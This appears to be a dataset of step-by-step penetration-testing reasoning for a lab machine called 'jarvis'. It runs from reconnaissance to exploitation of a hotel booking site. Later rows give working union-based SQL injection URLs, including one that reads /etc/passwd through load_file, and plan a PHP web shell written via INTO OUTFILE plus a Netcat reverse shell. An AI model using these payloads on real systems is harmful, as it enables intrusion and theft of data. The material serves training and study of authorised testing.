   - **Testing for client-side vulnerabilities**: This includes looking for cross-site scripting (XSS), CSRF vulnerabilities, and other client-side issues that might not be directly related to server configuration but can still provide an attack vector.

This strategy shift to manually checking the web application on port 80 is supported by the principle of depth over breadth in security testing. After automated tools have failed to reveal significant vulnerabilities in the server setup, a detailed manual review of the application's functionality and code might reveal subtler, exploitable flaws. This approach leverages the detailed understanding of the application gained from previous steps and aims to uncover vulnerabilities that require a deeper understanding of the application's context and logic.","Further Enumerate the website. - hidden directories, links and software","1. **Evaluation of Current Strategy**: The strategy involves a deeper manual investigation of the web application on port 80, particularly focusing on checking all links, URLs, and page sources. This step is chosen based on the earlier findings from the PTT, which indicated robust security measures against automated tools and no significant vulnerabilities found on both port 80 and 64999 through automated scanning.

2. **Key Findings Leading to Further Steps**: The PTT indicates that both automated and semi-automated approaches (like Gobuster scans) have been met with strong security responses, such as temporary bans and no significant vulnerabilities being uncovered through these methods. This suggests that:
   - **Automated Tools Limitation**: Automated and semi-automated tools might not be effective against well-hardened web applications, as they often miss context-specific vulnerabilities that require manual observation to detect.
   - **Potential for Hidden Vulnerabilities**: Despite the strong external security posture, there may still be vulnerabilities related to the application's logic, client-side code, or hidden directories that are not easily discoverable without thorough manual inspection.

3. **Logical Progression to Selected Step**: The decision to manually check all links, URLs, and page sources in the web application on port 80 is a strategic shift towards a more granular, in-depth examination of the application. This approach is aimed at:
   - **Discovering Hidden Directories and Links**: Manual navigation through the application can reveal links or directories that are not indexed or are disallowed in robots.txt but still accessible, potentially containing sensitive information or misconfigurations.
   - **Examining Page Sources for Hidden Inputs and Scripts**: Viewing the source code of web pages can uncover hidden form fields, comments that reveal internal information, or client-side scripts that contain vulnerabilities like XSS or reveal endpoints for potential CSRF attacks.
   - **Identifying Software and Libraries Used**: Sometimes, the page source includes references to JavaScript libraries, frameworks, or stylesheets that can disclose the versions of software being used, which might be vulnerable to specific exploits.

This selected step of further enumeration through manual inspection targets the complexities and nuances of the web application that automated tools cannot adequately address. It leverages the human ability to notice subtleties and context in web application structure and behavior, potentially uncovering vulnerabilities that automated scans have missed. This approach is critical given the previous results indicating a high level of server security, suggesting that vulnerabilities might only be found through detailed, context-aware exploration.","{'Web page interaction': 'Manually navigate the web application to check all links, URLs, and page sources for hidden directories, links, and software.'}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed:Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1
} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)","Check all the links, pages sources in the web application on port 80","1. **Evaluation of Current Strategy**: The strategy involves a deeper manual investigation of the web application on port 80, particularly focusing on checking all links, URLs, and page sources. This step is chosen based on the earlier findings from the PTT, which indicated robust security measures against automated tools and no significant vulnerabilities found on both port 80 and 64999 through automated scanning.

2. **Key Findings Leading to Further Steps**: The PTT indicates that both automated and semi-automated approaches (like Gobuster scans) have been met with strong security responses, such as temporary bans and no significant vulnerabilities being uncovered through these methods. This suggests that:
   - **Automated Tools Limitation**: Automated and semi-automated tools might not be effective against well-hardened web applications, as they often miss context-specific vulnerabilities that require manual observation to detect.
   - **Potential for Hidden Vulnerabilities**: Despite the strong external security posture, there may still be vulnerabilities related to the application's logic, client-side code, or hidden directories that are not easily discoverable without thorough manual inspection.

3. **Logical Progression to Selected Step**: The decision to manually check all links, URLs, and page sources in the web application on port 80 is a strategic shift towards a more granular, in-depth examination of the application. This approach is aimed at:
   - **Discovering Hidden Directories and Links**: Manual navigation through the application can reveal links or directories that are not indexed or are disallowed in robots.txt but still accessible, potentially containing sensitive information or misconfigurations.
   - **Examining Page Sources for Hidden Inputs and Scripts**: Viewing the source code of web pages can uncover hidden form fields, comments that reveal internal information, or client-side scripts that contain vulnerabilities like XSS or reveal endpoints for potential CSRF attacks.
   - **Identifying Software and Libraries Used**: Sometimes, the page source includes references to JavaScript libraries, frameworks, or stylesheets that can disclose the versions of software being used, which might be vulnerable to specific exploits.

This selected step of further enumeration through manual inspection targets the complexities and nuances of the web application that automated tools cannot adequately address. It leverages the human ability to notice subtleties and context in web application structure and behavior, potentially uncovering vulnerabilities that automated scans have missed. This approach is critical given the previous results indicating a high level of server security, suggesting that vulnerabilities might only be found through detailed, context-aware exploration.","**Webpage Navigation and Features - ""Stark Hotel"" (Port 80):**

- **Navigational Detail:**
  - **Rooms Tab:** Navigates to `/room-suites.php`.

- **Room Options Displayed:**
  1. **Superior Family Room**
     - **Price:** $270 per night
     - **Features:** Perfect for traveling couples, breakfast included.
     - **Additional Costs:** Price does not include VAT & services fee.
     - **Booking Link:** [Book now!]
  2. **Suite**
     - **Price:** $149 per night
     - **Availability:** Only 10 rooms available.
     - **Features:** Breakfast included.
     - **Additional Costs:** Price does not include VAT & services fee.
     - **Booking Link:** [Book now!]
  3. **Double Room**
     - **Price:** $199 per night
     - **Features:** Perfect for traveling couples, breakfast included.
     - **Additional Costs:** Price does not include VAT & services fee.
     - **Booking Link:** [Book now!]

- **Booking Process:**
  - **Action:** Clicking on the ""Book now!"" button.
  - **Result:** Opens a new URL with a query parameter named “cod”.

**Note:** The URL opened by the ""Book now!"" button was highlighted but not detailed in the summary provided.",Try an sql injection attack using the url,"1. **Check of Previous Step Achievement**: The previous step involved a detailed manual review of the web application on port 80, specifically focusing on navigating through the web pages and analyzing the underlying HTML source. The intended task was to uncover hidden directories, links, and software details through manual inspection. This task was successful as it revealed detailed navigational paths and functionalities within the ""Stark Hotel"" website, including the booking process that utilizes a URL with a query parameter named “cod”.

2. **Key Findings and Their Implications**: The key finding from the manual inspection was the discovery of a URL parameter “cod” that is used when a ""Book now!"" button is clicked. This parameter appears to be dynamically influencing the content or database queries, suggesting its use in database interactions. This is a critical observation because:
   - **Potential SQL Injection Vector**: The presence of a query parameter directly influencing database interactions is a classic entry point for SQL injection attacks, where malicious SQL statements could be inserted into the query to manipulate or exploit the database.
   - **Vulnerability Assessment Opportunity**: Since automated scans and other enumeration strategies have not revealed significant vulnerabilities, focusing on potential SQL injection through this parameter offers a new avenue to test the robustness of the application’s input handling and database security settings.

3. **Strategy Evaluation and Next Steps**: Given the discovery of a potentially exploitable query parameter, the strategy to attempt an SQL injection is both logical and warranted. This involves:
   - **Testing for SQL Injection**: Utilizing tools or manual techniques to test how the application handles SQL code inserted into the ""cod"" parameter. This can help determine if the application is vulnerable to SQL injection, which could allow unauthorized database access or manipulation.
   - **Expanding Attack Surface Understanding**: If an SQL injection vulnerability is found, it could provide deeper access to the application's backend, revealing more about the data structure and potentially uncovering further vulnerabilities.
   - **Ethical and Legal Considerations**: It’s crucial to ensure that all testing is authorized and conducted within the bounds of ethical hacking guidelines to prevent legal issues and ensure the integrity of the target system is not compromised.

This shift in strategy to attempt an SQL injection attack is based on the specific findings from the manual review of the application and represents a focused attempt to uncover high-impact vulnerabilities that automated tools failed to detect. This approach leverages the specific insight gained about the application's functionality and directly tests the security of user input handling, which is a common vulnerability in web applications.",Exploit the selected exploitations,"1. **Evaluation of Current Strategy**: The strategy to try an SQL injection attack using the URL focuses on exploiting the query parameter ""cod"" identified during the manual webpage analysis. The presence of this parameter, which influences database queries, presents a potential vulnerability that could be exploited through SQL injection. This type of attack involves inserting or ""injecting"" SQL commands into the query parameter to manipulate the database in unauthorized ways.

2. **Key Findings Leading to Further Steps**: The previous steps in the PTT revealed that the ""Book now!"" button on the hotel booking page appends a query parameter (""cod"") to the URL, which likely interacts with the backend database to retrieve specific information about room availability and bookings. This observation suggests that the parameter is a point of interaction with the database, making it a prime candidate for testing SQL injection vulnerabilities.

3. **Logical Progression to Selected Step**: The decision to exploit potential vulnerabilities through SQL injection is based on the identification of the ""cod"" parameter as a direct input into a database system. This step involves:
   - **Testing Different SQL Injection Techniques**: This includes trying various SQL injection payloads to see if the application improperly handles SQL queries, which could allow unauthorized access or manipulation of the database. Techniques might include tautologies, union attacks, and time-based blind SQL injection.
   - **Observing Responses**: By monitoring how the application responds to different injections (e.g., error messages, unexpected behavior, successful retrieval of unauthorized data), we can determine the presence and extent of SQL injection vulnerabilities.
   - **Refining Attack Vectors**: Depending on the initial responses, further refine the SQL injection attempts to explore other aspects of the database or to escalate privileges within the application.

This step of actively trying different types of SQL injection attacks is a direct follow-up to the discovery of a potentially vulnerable input field. It aims to test the robustness of the application's input sanitation and error handling mechanisms. If successful, this could not only confirm the presence of an SQL injection vulnerability but also potentially provide deeper access to sensitive data or system functionalities, which could be critical in understanding the security posture of the entire application. This approach is methodical and builds upon specific findings from the manual review, targeting a likely vulnerability for a potentially high-impact security exploit.","{'SQLmap': ""Test various SQL injection payloads on the 'cod' query parameter to exploit potential vulnerabilities.""}"
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)",Try an sql injection attack using the url,"1. **Evaluation of Current Strategy**: The strategy to try an SQL injection attack using the URL focuses on exploiting the query parameter ""cod"" identified during the manual webpage analysis. The presence of this parameter, which influences database queries, presents a potential vulnerability that could be exploited through SQL injection. This type of attack involves inserting or ""injecting"" SQL commands into the query parameter to manipulate the database in unauthorized ways.

2. **Key Findings Leading to Further Steps**: The previous steps in the PTT revealed that the ""Book now!"" button on the hotel booking page appends a query parameter (""cod"") to the URL, which likely interacts with the backend database to retrieve specific information about room availability and bookings. This observation suggests that the parameter is a point of interaction with the database, making it a prime candidate for testing SQL injection vulnerabilities.

3. **Logical Progression to Selected Step**: The decision to exploit potential vulnerabilities through SQL injection is based on the identification of the ""cod"" parameter as a direct input into a database system. This step involves:
   - **Testing Different SQL Injection Techniques**: This includes trying various SQL injection payloads to see if the application improperly handles SQL queries, which could allow unauthorized access or manipulation of the database. Techniques might include tautologies, union attacks, and time-based blind SQL injection.
   - **Observing Responses**: By monitoring how the application responds to different injections (e.g., error messages, unexpected behavior, successful retrieval of unauthorized data), we can determine the presence and extent of SQL injection vulnerabilities.
   - **Refining Attack Vectors**: Depending on the initial responses, further refine the SQL injection attempts to explore other aspects of the database or to escalate privileges within the application.

This step of actively trying different types of SQL injection attacks is a direct follow-up to the discovery of a potentially vulnerable input field. It aims to test the robustness of the application's input sanitation and error handling mechanisms. If successful, this could not only confirm the presence of an SQL injection vulnerability but also potentially provide deeper access to sensitive data or system functionalities, which could be critical in understanding the security posture of the entire application. This approach is methodical and builds upon specific findings from the manual review, targeting a likely vulnerability for a potentially high-impact security exploit.","**SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80):**

- **Vulnerable Parameter:** `cod` in the URL `http://10.10.10.143/room.php?cod=`
  - **Expectation:** Server expects an integer value.
  - **Vulnerability:** Susceptible to SQL injection.
  - **Database Insight:** The table accessed by the query contains 7 rows.

- **Injection Testing:**
  - **Method:** Union based SQL injection.
  - **Test Query:** `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`
  - **Resulting Output:** Displays values 5, 2, 3, and 4.
  - **Inference:** These values are injectable, indicating potential columns for data extraction.

- **Additional Information from Output:**
  - **Displayed Content:** 
    - Price: $3 per night
    - Booking Link: [Go to book!]

**Note:** The output values from the test query (5, 2, 3, 4) suggest specific columns that are responsive to the SQL injection, indicating areas for further exploitation testing.",Try to get the database information and user information,"1. **Evaluation of Previous Step Achievement**: The previous step involved testing for SQL injection vulnerabilities on the ""Stark Hotel"" server, specifically exploiting the ""cod"" parameter in the URL. The intended task was to determine if the parameter was vulnerable to SQL injection and to identify which database columns could be manipulated. This task was successfully achieved:
   - **SQL Injection Confirmation**: The test using a union-based SQL injection (`http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`) resulted in specific outputs (values 5, 2, 3, and 4), confirming that the application is susceptible to SQL injection.
   - **Column Accessibility**: The results indicated that columns 2, 3, 4, and 5 are injectable and can be used to extract data, which provides a clear path for further exploitation.

2. **Key Findings and Implications for Further Steps**:
   - **Vulnerable Columns Identified**: The ability to manipulate and retrieve data from columns 2, 3, 4, and 5 suggests that these columns could contain useful information such as user details or other sensitive data stored in the database.
   - **Potential for Data Extraction**: Given the success in identifying injectable columns, the next logical step is to exploit these columns to extract more detailed information, such as database metadata (e.g., table names, column names) and sensitive user information (e.g., usernames, passwords).

3. **Strategy Evaluation and Next Steps**:
   - **Expanding the SQL Injection Attack**: With the confirmed vulnerability and knowledge of which columns are responsive, the strategy to extract detailed database and user information is well-founded and should be pursued next. This involves:
     - **Database Schema Exploration**: Using the SQL injection vulnerability to query the database schema, retrieving information like table names and their respective column details. This can be done using SQL commands tailored to extract metadata.
     - **User Information Extraction**: Specifically targeting tables and columns that likely contain user information. This could involve crafting SQL queries to retrieve usernames, email addresses, password hashes, and other personally identifiable information (PII).
   - **Ethical Considerations and Security Implications**: As with all penetration testing activities, it's crucial to ensure that these actions are authorized and that they adhere to ethical hacking standards. The goal is to identify and report vulnerabilities without exploiting them for unauthorized access.

Given the findings from the previous steps and the critical nature of the vulnerabilities identified, moving forward with the strategy to extract database and user information using the known SQL injection points is both a logical and necessary step. This will not only demonstrate the potential impact of the vulnerability but also help in prioritizing security measures to mitigate such risks.",Exploit the selected exploitations,"1. **Assessment of Current Strategic Position**: The updated PTT confirms the successful identification of SQL injection vulnerabilities within the ""Stark Hotel"" server. Specifically, the ability to manipulate and retrieve data using the ""cod"" parameter in the URL has been established. The findings indicate that certain database columns (2, 3, 4, and 5) are responsive to injection, which presents a direct opportunity to extract further information from the database.

2. **Key Findings Leading to Further Steps**:
   - **Identified Injectable Columns**: The successful SQL injection test revealed that columns 2, 3, 4, and 5 can be manipulated, suggesting that these columns can be used to extract additional data, potentially including sensitive or critical information.
   - **Evidence of SQL Injection Vulnerability**: The ability to inject SQL commands and receive meaningful data in response confirms that the application's input sanitization and security controls around the database interaction are insufficient. This vulnerability can be leveraged to gain more detailed insights into the database structure and contents.

3. **Logical Progression to Selected Step**:
   - **Exploiting Known Vulnerabilities**: With the confirmed SQL injection points, the strategy to use these vulnerabilities to extract database and user information is both logical and necessary. This step involves:
     - **Crafting Specific SQL Queries**: Tailoring SQL queries to exploit the identified columns for retrieving detailed database information (e.g., schema details, table names) and sensitive user information (e.g., user credentials, personal data).
     - **Systematic Data Extraction**: Systematically querying the database to map out its structure and extract as much information as possible, focusing on areas that are typically rich in sensitive data.
   - **Enhancing Understanding of Security Posture**: By extracting this information, the depth of the security flaws can be better understood, which is crucial for developing effective mitigation strategies.

This step of actively exploiting the SQL injection vulnerabilities to extract detailed database and user information builds directly upon the vulnerabilities uncovered in previous steps. It aims to maximize the insights gained from the SQL injection points, providing a comprehensive understanding of the potential risks and impacts associated with the security weaknesses in the application. This approach is methodical and leverages specific technical findings to deepen the security analysis, ultimately aiming to enhance the overall security posture of the application by identifying critical data exposures.",{'SQLmap': 'Craft and execute SQL queries to exploit identified SQL injection vulnerabilities and extract database information.'}
jarvis,"1. Reconnaissance - [to-do]
   1.1 Passive Information Gathering - (completed)
   1.2 Active Information Gathering - (completed)
   1.3 Identify Open Ports, Services running on the open ports and their versions - (completed)
       1.3.1 Perform a port scan - {Host Status: Up (0.15s latency)} (completed)
       1.3.2 Determine the services and versions on each open port - {Port 22/tcp: State: Open, Service: SSH, Version: OpenSSH 7.4p1 Debian 10+deb9u6, Protocol: 2.0; Port 80/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), HTTP Cookie Flags: Path: /, PHPSESSID: httponly flag not set, Server Header: Apache/2.4.25 (Debian), Page Title: Stark Hotel; Port 64999/tcp: State: Open, Service: HTTP, Version: Apache httpd 2.4.25 (Debian), Server Header: Apache/2.4.25 (Debian), Page Title: Site doesn't have a title (text/html)} (completed)
   1.4 Target IP - 10.10.10.143 (completed)
   1.5 Webpage Analysis on Apache Server (Port 80) - ""Stark Hotel"" - (completed)
       1.5.1 Webpage Title - Stark Hotel (completed)
       1.5.2 Notable Feature - Login option available (completed)
       1.5.3 Virtual Host (vhost) - supersecurehotel.htb (requires addition to the hosts file for proper resolution) (completed)
       1.5.4 Webpage Security Note - {Observation: The webpage titled ""Stark Hotel"" is noted to be hardened; Outcome: Attempts to interact or scan the page resulted in the same outcomes as previously noted, indicating robust security measures are in effect} (completed)
       1.5.5 Webpage Navigation and Features - {Navigational Detail: Rooms Tab navigates to /room-suites.php; Room Options Displayed: Contains room details and their prices. Booking Link: [Book now!]; Booking Process: Action: Clicking on the ""Book now!"" button, Result: Opens a new URL with a query parameter named “cod”. http://10.10.10.143/room.php?cod=1} (completed)
   1.6 Gobuster Scanning Outcome - (completed)
       1.6.1 Action - Running Gobuster to scan the server (completed)
       1.6.2 Result - Received a ban message stating, ""Hey you have been banned for 90 seconds, don't be bad."" (completed)
       1.6.3 Implication - The server has active measures to prevent automated scanning tools, complicating further scanning activities (completed)
   1.7 SQL Injection Vulnerability Analysis - ""Stark Hotel"" Server (Port 80) - (completed)
       1.7.1 Vulnerable Parameter - {Parameter: `cod` in the URL `http://10.10.10.143/room.php?cod=`; Expectation: Server expects an integer value; Vulnerability: Susceptible to SQL injection; Database Insight: The table accessed by the query contains 7 rows} (completed)
       1.7.2 Injection Testing - {Method: Union based SQL injection; Test Query: `http://10.10.10.143/room.php?cod=-1 union select 1,2,3,4,5,6,7`; Resulting Output: Displays values 5, 2, 3, and 4; Inference: These values are injectable, indicating potential columns for data extraction} (completed)
       1.7.3 Additional Information from Output - {Displayed Content: Price: $3 per night; Booking Link: [Go to book!]} (completed)
   1.8 SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80) - (completed)
       1.8.1 Injection Technique - {Test Query 1: `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`; Output Interpretation: Database Version: 10.1.37-MariaDB-0+deb9u1, Current Database User: DBadmin@localhost; Displayed Content: Price symbol and [Go to book!] link} (completed)
       1.8.2 File Interaction Capabilities - {Test Query 2: `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`; Output: Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`; Apache Configuration Inspection: Configuration Path: `/etc/apache2/sites-enabled/000-default.conf`, Relevant Configuration Details: DocumentRoot: /var/www/html, ServerName Directive: Used for redirection URLs and virtual host identification; Potential for File Writing: In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot} (completed)
       1.8.3 Security Implications - {Database Access: The ability to query the database version and current user suggests elevated privileges or weak security configurations; File Reading: Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation; File Writing: The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities} (completed)
       1.8.4 Recommendation - {Immediate Action: Audit and restrict SQL query handling on the server to prevent SQL injection; Further Investigation: Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure} (completed)",Try to get the database information and user information,"1. **Assessment of Current Strategic Position**: The updated PTT confirms the successful identification of SQL injection vulnerabilities within the ""Stark Hotel"" server. Specifically, the ability to manipulate and retrieve data using the ""cod"" parameter in the URL has been established. The findings indicate that certain database columns (2, 3, 4, and 5) are responsive to injection, which presents a direct opportunity to extract further information from the database.

2. **Key Findings Leading to Further Steps**:
   - **Identified Injectable Columns**: The successful SQL injection test revealed that columns 2, 3, 4, and 5 can be manipulated, suggesting that these columns can be used to extract additional data, potentially including sensitive or critical information.
   - **Evidence of SQL Injection Vulnerability**: The ability to inject SQL commands and receive meaningful data in response confirms that the application's input sanitization and security controls around the database interaction are insufficient. This vulnerability can be leveraged to gain more detailed insights into the database structure and contents.

3. **Logical Progression to Selected Step**:
   - **Exploiting Known Vulnerabilities**: With the confirmed SQL injection points, the strategy to use these vulnerabilities to extract database and user information is both logical and necessary. This step involves:
     - **Crafting Specific SQL Queries**: Tailoring SQL queries to exploit the identified columns for retrieving detailed database information (e.g., schema details, table names) and sensitive user information (e.g., user credentials, personal data).
     - **Systematic Data Extraction**: Systematically querying the database to map out its structure and extract as much information as possible, focusing on areas that are typically rich in sensitive data.
   - **Enhancing Understanding of Security Posture**: By extracting this information, the depth of the security flaws can be better understood, which is crucial for developing effective mitigation strategies.

This step of actively exploiting the SQL injection vulnerabilities to extract detailed database and user information builds directly upon the vulnerabilities uncovered in previous steps. It aims to maximize the insights gained from the SQL injection points, providing a comprehensive understanding of the potential risks and impacts associated with the security weaknesses in the application. This approach is methodical and leverages specific technical findings to deepen the security analysis, ultimately aiming to enhance the overall security posture of the application by identifying critical data exposures.","**SQL Injection Exploitation Details - ""Stark Hotel"" Server (Port 80):**

- **Injection Technique:**
  - **Test Query 1:** `http://10.10.10.143/room.php?cod=-1 union select 1,database(),user(),4,5,6,7`
    - **Output Interpretation:**
      - **Database Version:** 10.1.37-MariaDB-0+deb9u1
      - **Current Database User:** DBadmin@localhost
    - **Displayed Content:** Price symbol and [Go to book!] link.

  - **Test Query 2:** `http://10.10.10.143/room.php?cod=-1 union select 1,load_file('/etc/passwd'),3,4,5,6,7`
    - **Output:** Lists system users (`root`, `daemon`, `bin`, etc.), indicating successful reading of sensitive system file `/etc/passwd`.

- **File Interaction Capabilities:**
  - **Apache Configuration Inspection:**
    - **Configuration Path:** `/etc/apache2/sites-enabled/000-default.conf`
    - **Relevant Configuration Details:**
      - **DocumentRoot:** /var/www/html
      - **ServerName Directive:** Used for redirection URLs and virtual host identification.
    - **Potential for File Writing:**
      - In MySQL, files can be written to the server using the `INTO OUTFILE` keyword, targeting the configured DocumentRoot.

**Security Implications:**
1. **Database Access:**
   - The ability to query the database version and current user suggests elevated privileges or weak security configurations.
2. **File Reading:**
   - Ability to read `/etc/passwd` demonstrates significant security risks, potentially allowing further exploitation such as privilege escalation.
3. **File Writing:**
   - The potential to write files using MySQL’s `INTO OUTFILE` could be exploited to execute arbitrary code or persist access if combined with other vulnerabilities.

**Recommendation:**
- **Immediate Action:** Audit and restrict SQL query handling on the server to prevent SQL injection.
- **Further Investigation:** Review server configuration for file permissions and secure database access controls to mitigate the risks of unauthorized file operations and data exposure.",Try to create a reverese shell using the write permissions,"1. **Evaluation of Previous Step Achievement**: The prior steps in the penetration testing task list (PTT) focused on exploiting SQL injection vulnerabilities and assessing the server's file interaction capabilities. The results confirmed that:
   - **SQL Injection was Successful**: The ability to inject SQL and retrieve sensitive information such as the database version, current database user, and read system files (`/etc/passwd`) was established.
   - **File Interaction Capabilities**: The server's configuration was inspected, revealing that files could potentially be written to the server using MySQL’s `INTO OUTFILE` function, targeting the configured DocumentRoot. This indicates write permissions that could be exploited.

2. **Key Findings and Implications for Further Steps**:
   - **Write Permissions Confirmed**: The ability to potentially write files to the server's document root is a significant security vulnerability. Given that the server allows for file writing through SQL commands, this can be exploited to upload malicious files, such as a web shell.
   - **Potential for Reverse Shell**: By writing a web shell to the server, an attacker could execute arbitrary commands on the server, potentially escalating to a reverse shell. This would provide the attacker with interactive control over the server, simulating full system access.

3. **Strategy Evaluation and Next Steps**:
   - **Moving Forward with Reverse Shell Creation**: The strategy to use the confirmed write permissions to create a reverse shell is a logical progression from the current findings. This involves:
     - **Writing a Web Shell**: Crafting a SQL query to write a simple PHP web shell into the server’s web directory using the `INTO OUTFILE` SQL command. The web shell would include functions to execute system commands.
     - **Executing the Web Shell for Reverse Shell**: Once the web shell is in place, it can be accessed via a web browser to execute a reverse shell command, which connects back to a listener set up by the tester on their machine.
   - **Ethical and Legal Considerations**: As with all penetration testing activities, this step must be authorized and should aim to identify and report vulnerabilities without causing harm or unauthorized data access.

Given the critical nature of the vulnerabilities identified and the potential for significant system control, moving forward with the strategy to create a reverse shell using the write permissions is both strategically sound and necessary for demonstrating the impact of the vulnerabilities. This step will help in understanding the full extent of potential system compromise and assist in prioritizing security measures to mitigate such risks.",Exploit the selected exploitations,"1. **Assessment of Current Strategic Position**: According to the updated PTT, the previous steps confirmed the server's susceptibility to SQL injection and demonstrated the ability to interact with the file system, specifically using the `INTO OUTFILE` SQL command. This indicates that the server permits writing files to a specified directory, which is a significant security vulnerability.

2. **Key Findings Leading to Further Steps**:
   - **Confirmed Write Permissions**: The ability to write files to the server's document root through SQL commands was established. This opens up the possibility of uploading arbitrary files, such as a web shell.
   - **Potential for Reverse Shell**: The presence of write permissions can be exploited to upload a web shell, which can then be used to execute system commands remotely. This could potentially escalate to gaining a reverse shell, providing interactive control over the server.

3. **Logical Progression to Selected Step**:
   - **Writing a Web Shell**: The next logical step is to exploit the write permissions to upload a web shell. This can be achieved by crafting a SQL query that uses the `INTO OUTFILE` command to write a PHP script into the server's web directory. The PHP script would be designed to execute system commands passed to it via HTTP requests.
   - **Gaining Reverse Shell Access**: Once the web shell is successfully uploaded and accessible via the web server, it can be used to initiate a reverse shell. This involves sending a command through the web shell that triggers a connection back to a listener (controlled by the tester) on another machine. This reverse shell would allow for full, interactive control over the server, mimicking the capabilities of an authenticated user.

4. **Ethical and Security Considerations**:
   - **Controlled Testing Environment**: It is crucial to ensure that these actions are conducted in a controlled environment where they are authorized. This step is aimed at demonstrating the potential impact of the vulnerability and helping system administrators understand the need for stringent security measures.
   - **Mitigation and Reporting**: Following the demonstration, it is necessary to report the findings and recommend measures to secure the file writing capabilities and address the SQL injection vulnerabilities, thus preventing potential exploitation by malicious actors.

By moving forward with the strategy to write a web shell and attempt to gain reverse shell access, we are directly building upon the established vulnerabilities to demonstrate a critical security risk. This approach not only tests the server's response to more advanced exploitation techniques but also helps in prioritizing security enhancements to mitigate these vulnerabilities.","{'SQLmap': ""Craft and execute SQL query to write a PHP web shell to the server's document root using INTO OUTFILE."", 'Netcat': 'Set up a listener to receive a reverse shell connection from the uploaded web shell.'}"
